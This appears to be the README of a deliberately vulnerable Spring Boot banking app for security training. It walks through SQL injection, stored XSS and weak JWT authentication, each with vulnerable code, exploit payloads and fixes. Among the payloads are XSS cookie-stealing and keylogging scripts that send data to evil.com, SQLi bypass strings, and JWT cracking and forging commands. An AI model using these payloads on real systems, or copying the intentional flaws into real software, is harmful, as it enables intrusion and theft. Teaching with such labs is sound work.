# VulnBank 🏦💀

> **Deliberately vulnerable Spring Boot application for security education.**

```
██╗   ██╗██╗   ██╗██╗     ███╗   ██╗██████╗  █████╗ ███╗   ██╗██╗  ██╗
██║   ██║██║   ██║██║     ████╗  ██║██╔══██╗██╔══██╗████╗  ██║██║ ██╔╝
██║   ██║██║   ██║██║     ██╔██╗ ██║██████╔╝███████║██╔██╗ ██║█████╔╝ 
╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║██╔══██╗██╔══██║██║╚██╗██║██╔═██╗ 
 ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║██████╔╝██║  ██║██║ ╚████║██║  ██╗
  ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
```

> ⚠️ **FOR EDUCATIONAL USE ONLY. Never deploy to production or public networks.**

---

## Table of Contents

- [About](#about)
- [Stack](#stack)
- [Quick Start](#quick-start)
- [Vulnerabilities](#vulnerabilities)
  - [1. SQL Injection](#1-sql-injection)
  - [2. XSS](#2-cross-site-scripting-xss)
  - [3. Broken Authentication](#3-broken-authentication)
- [Project Structure](#project-structure)
- [Attack Scripts](#attack-scripts)
- [Fixes](#fixes)
- [Learning Resources](#learning-resources)

---

## About

VulnBank is a fake online banking portal built with **intentional security vulnerabilities** for hands-on penetration testing practice. It mirrors the kinds of flaws commonly found in real-world applications.

This project is suitable for:
- Security students learning OWASP Top 10
- Developers learning secure coding practices
- CTF preparation
- Demonstrating real attack → fix cycles in portfolio projects

---

## Stack

| Layer      | Technology              |
|------------|-------------------------|
| Backend    | Spring Boot 3.2 + JPA   |
| Database   | H2 (in-memory)          |
| Templates  | Thymeleaf               |
| Auth       | JWT (jjwt 0.9.1)        |
| Container  | Docker + Docker Compose |
| Attack scripts | Python 3.x         |

---

## Quick Start

### Option A — Docker (recommended)

```bash
git clone https://github.com/yourname/vulnerable-spring-app
cd vulnerable-spring-app/docker

docker-compose up --build
```

App runs at → **http://localhost:8080**  
H2 Console  → **http://localhost:8080/h2-console**

### Option B — Maven

```bash
cd vulnerable-spring-app
mvn spring-boot:run
```

### Default Credentials

| Username | Password  | Role  |
|----------|-----------|-------|
| admin    | admin123  | ADMIN |
| alice    | password1 | USER  |
| bob      | qwerty    | USER  |
| charlie  | letmein   | USER  |

---

## Vulnerabilities

---

### 1. SQL Injection

**OWASP A03:2021 — Injection**

#### The Vulnerability

User-supplied input is concatenated directly into SQL queries without sanitization or parameterization. The database executes attacker-controlled SQL code.

**Vulnerable code** (`AuthController.java`):

```java
// ❌ VULNERABLE — user input lands directly in SQL string
String sql = "SELECT * FROM users WHERE username = '" + username
           + "' AND password = '" + password + "'";
entityManager.createNativeQuery(sql, User.class).getResultList();
```

**Vulnerable code** (`UserController.java`):

```java
// ❌ VULNERABLE — search parameter injected into LIKE clause
String sql = "SELECT * FROM users WHERE username LIKE '%" + q + "%'";
```

#### How to Exploit

**1. Authentication Bypass** — login without a password:

```
POST /api/auth/login
{
  "username": "admin' --",
  "password": "anything"
}
```

Resulting SQL:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
-- The -- comments out the password check. Login succeeds as admin.
```

**2. Always-True Condition** — dump all users:

```
GET /api/users/search?q=' OR '1'='1
```

Resulting SQL:
```sql
SELECT * FROM users WHERE username LIKE '%' OR '1'='1%'
-- Returns every row in the users table, including passwords.
```

**3. UNION Injection** — extract any column:

```
GET /api/users/search?q=' UNION SELECT id,username,password,email,role,CAST(balance AS VARCHAR) FROM users--
```

**Run the attack script:**

```bash
cd attacks
pip install requests
python 01_sql_injection.py
```

#### Fix

```java
// ✅ Option A — Named parameters (never interpolated into SQL)
String sql = "SELECT * FROM users WHERE username = :username AND password = :password";
entityManager.createNativeQuery(sql, User.class)
    .setParameter("username", username)
    .setParameter("password", password)
    .getResultList();

// ✅ Option B — Spring Data JPA (even better)
userRepository.findByUsernameAndPassword(username, password);

// ✅ Also — hash passwords with BCrypt, never store plaintext
boolean valid = passwordEncoder.matches(rawPassword, user.getPassword());
```

See full fix: [`fixes/01_sql_injection_fix.java`](fixes/01_sql_injection_fix.java)

---

### 2. Cross-Site Scripting (XSS)

**OWASP A03:2021 — Injection**

#### The Vulnerability

User-submitted message content is stored without sanitization and rendered as raw HTML using Thymeleaf's `th:utext` (unescaped). Any JavaScript in a message executes in every visitor's browser.

**Vulnerable template** (`messages.html`):

```html
<!-- ❌ th:utext renders raw HTML — attacker content executes as code -->
<div class="message-content" th:utext="${msg.content}">content</div>
```

**Vulnerable controller** (`MessageController.java`):

```java
// ❌ Content stored without any sanitization
Message message = new Message(null, author, content);
messageRepository.save(message);
```

#### How to Exploit

**1. Proof of Concept:**

```
POST /messages/api/messages
{
  "author": "attacker",
  "content": "<script>alert('XSS: ' + document.domain)</script>"
}
```

Visit `http://localhost:8080/messages` → alert fires in every visitor's browser.

**2. Session Cookie Theft:**

```json
{
  "author": "attacker",
  "content": "<script>new Image().src='https://evil.com/steal?c='+document.cookie</script>"
}
```

**3. Page Defacement:**

```json
{
  "content": "<img src=x onerror=\"document.body.innerHTML='<h1>HACKED</h1>'\">"
}
```

**4. Keylogger:**

```json
{
  "content": "<script>document.addEventListener('keypress',e=>new Image().src='https://evil.com/k?k='+e.key)</script>"
}
```

**Run the attack script:**

```bash
python attacks/02_xss.py
# Then open http://localhost:8080/messages
```

#### Fix

```html
<!-- ✅ th:text auto-escapes — <script> becomes &lt;script&gt; -->
<div class="message-content" th:text="${msg.content}">content</div>
```

```java
// ✅ Server-side sanitization with OWASP Java HTML Sanitizer
PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
String safeContent = policy.sanitize(rawContent);
```

```java
// ✅ Content Security Policy header blocks inline script execution
http.headers(h -> h.contentSecurityPolicy(
    csp -> csp.policyDirectives("default-src 'self'; script-src 'self'")
));
```

See full fix: [`fixes/02_xss_fix.java`](fixes/02_xss_fix.java)

---

### 3. Broken Authentication

**OWASP A07:2021 — Identification and Authentication Failures**

#### The Vulnerabilities

Three compounding weaknesses:

| # | Issue | Impact |
|---|-------|--------|
| A | JWT has **no expiration time** | Stolen token is valid forever |
| B | **No rate limiting** on login | Brute force in seconds |
| C | **Weak hardcoded secret** (`secret123`) | JWT signature forgeable |

**Vulnerable JWT generation** (`JwtUtil.java`):

```java
// ❌ No .setExpiration() call — token lives forever
return Jwts.builder()
    .setClaims(claims)
    .setSubject(username)
    .setIssuedAt(new Date())
    // ← missing: .setExpiration(...)
    .signWith(SignatureAlgorithm.HS256, secret)   // ← "secret123"
    .compact();
```

**No rate limiting** (`AuthController.java`):

```java
// ❌ No throttling — attacker can try unlimited passwords
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody Map<String, String> credentials) {
    // Direct to auth logic with no attempt tracking
}
```

#### How to Exploit

**1. Get a token — it never expires:**

```bash
curl -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password1"}'
```

Decode the JWT at [jwt.io](https://jwt.io) — notice no `exp` claim:

```json
{
  "sub": "alice",
  "role": "USER",
  "iat": 1700000000
  // ← no "exp" field
}
```

**2. Brute force login** (no lockout, no delay, no rate limit):

```bash
python attacks/03_broken_auth.py
# Tries 25 common passwords against admin
# Cracks "admin123" in < 3 seconds
```

**3. Crack the weak JWT secret:**

The secret `secret123` can be cracked offline in milliseconds:

```bash
# Using hashcat or jwt-cracker:
hashcat -a 0 -m 16500 token.txt wordlist.txt
```

Once cracked, forge any token:

```python
import jwt
forged = jwt.encode(
    {"sub": "admin", "role": "ADMIN"},
    "secret123",
    algorithm="HS256"
)
```

#### Fix

```java
// ✅ A — Set expiration (15 min)
.setExpiration(new Date(System.currentTimeMillis() + 15 * 60 * 1000L))

// ✅ B — Rate limiting with Bucket4j (5 attempts / minute per IP)
Bucket bucket = loginRateLimiter.resolveBucket(request.getRemoteAddr());
if (!bucket.tryConsume(1)) {
    return ResponseEntity.status(429).body("Too many attempts");
}

// ✅ C — Strong secret from environment variable (never hardcoded)
# application.properties
jwt.secret=${JWT_SECRET}
# Generate: openssl rand -base64 32
```

See full fix: [`fixes/03_auth_fix.java`](fixes/03_auth_fix.java)

---

## Project Structure

```
vulnerable-spring-app/
│
├── src/
│   └── main/
│       ├── java/com/vulnerable/app/
│       │   ├── VulnerableApplication.java     # Entry point
│       │   ├── config/
│       │   │   ├── JwtUtil.java               # ⚠️ JWT without expiry
│       │   │   └── SecurityConfig.java        # ⚠️ CSRF off, all permitted
│       │   ├── controller/
│       │   │   ├── AuthController.java        # ⚠️ SQLi + no rate limit
│       │   │   ├── UserController.java        # ⚠️ SQLi + IDOR
│       │   │   └── MessageController.java     # ⚠️ XSS
│       │   ├── model/
│       │   │   ├── User.java                  # ⚠️ Plaintext password
│       │   │   └── Message.java
│       │   └── repository/
│       │       ├── UserRepository.java
│       │       └── MessageRepository.java
│       └── resources/
│           ├── application.properties         # ⚠️ Hardcoded JWT secret
│           ├── data.sql                       # Seed data
│           ├── static/index.html              # Lab UI
│           └── templates/messages.html        # ⚠️ th:utext XSS
│
├── docs/
│   └── (architecture diagrams, threat model)
│
├── docker/
│   ├── Dockerfile
│   └── docker-compose.yml
│
├── attacks/
│   ├── 01_sql_injection.py   # SQLi PoC scripts
│   ├── 02_xss.py             # XSS payload injection
│   └── 03_broken_auth.py     # Brute force + JWT analysis
│
├── fixes/
│   ├── 01_sql_injection_fix.java   # Parameterized queries
│   ├── 02_xss_fix.java             # Output encoding + CSP
│   └── 03_auth_fix.java            # JWT expiry + rate limiting
│
├── pom.xml
└── README.md
```

---

## Attack Scripts

All attack scripts are in `/attacks` and require Python 3.8+:

```bash
pip install requests
python attacks/01_sql_injection.py    # SQLi bypass + data dump
python attacks/02_xss.py              # Store XSS payloads
python attacks/03_broken_auth.py      # Brute force + JWT crack
```

---

## Fixes

Each vulnerability has a corresponding fix file in `/fixes` with:
- Vulnerable code (annotated)
- Fixed code with explanations
- Multiple remediation options (basic → best practice)

---

## Learning Resources

| Resource | Link |
|----------|------|
| OWASP Top 10 | https://owasp.org/Top10/ |
| OWASP Testing Guide | https://owasp.org/www-project-web-security-testing-guide/ |
| PortSwigger Web Security Academy | https://portswigger.net/web-security |
| SQL Injection Cheatsheet | https://portswigger.net/web-security/sql-injection/cheat-sheet |
| XSS Cheatsheet | https://portswigger.net/web-security/cross-site-scripting/cheat-sheet |
| JWT Security | https://portswigger.net/web-security/jwt |

---

## Disclaimer

This application is intentionally insecure. It is designed **solely for educational purposes** in controlled, isolated lab environments.

- ❌ Do not deploy to any public-facing server
- ❌ Do not use against systems you don't own or have permission to test
- ✅ Run locally or in an isolated Docker network
- ✅ Use to learn, practice, and demonstrate secure coding
